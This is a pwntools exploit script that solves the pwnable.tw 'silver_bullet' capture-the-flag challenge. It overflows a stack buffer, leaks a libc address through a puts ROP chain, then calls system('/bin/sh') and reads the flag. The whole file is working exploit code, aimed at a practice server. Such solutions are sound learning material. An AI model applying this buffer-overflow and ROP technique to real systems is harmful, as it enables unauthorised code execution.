#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("silver_bullet_patched")
libc = elf.libc

local = False 
if local:
    p = process("./silver_bullet_patched")
    gdb.attach(p,'''
    b*create_bullet+110
    c
    c
    ''')
else:
    p = remote('chall.pwnable.tw', 10103)

elf = context.binary = ELF('./silver_bullet_patched', checksec=False)

def create(data):
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"Give me your description of bullet :", data)
    print("\n[*]Create: Done")

def power_up(data):
    p.sendlineafter(b"Your choice :", b"2")
    p.sendlineafter(b"Give me your another description of bullet :", data)
    print("\n[*]Power up: Done")

def kill():
    p.sendlineafter(b"Your choice :", b"3")

put_got = 0x804afdc
put_plt = 0x080484a8
beat = 0x08048733
main = 0x08048954

create(b"2")
power_up(b"a"*16)
power_up(b"b"*16)
power_up(b"c"*16)
power_up(b"d"*7 + p32(put_plt) + p32(main) + p32(put_got) )
kill()
kill()
p.recvuntil(b"Oh ! You win !!\n")
libc_base = int.from_bytes(p.recv(4),"little") - 389440
system = libc_base + 0x0003a940
binsh = libc_base + 0x158e8b
print("[+]Libc_base:    ", hex(libc_base))
print("[+]Libc_system:  ", hex(system))
print("[+]Libc_binsh:   ", hex(binsh))

create(b"2")
power_up(b"a"*16)
power_up(b"b"*16)
power_up(b"c"*16)
power_up(b"d"*7 + p32(system) + p32(main) + p32(binsh) )
kill()
kill()
if local: 
    p.sendline(b"id")
else:
    p.sendline(b"cd home/silver_bullet")
    p.sendline(b"cat flag")
p.interactive()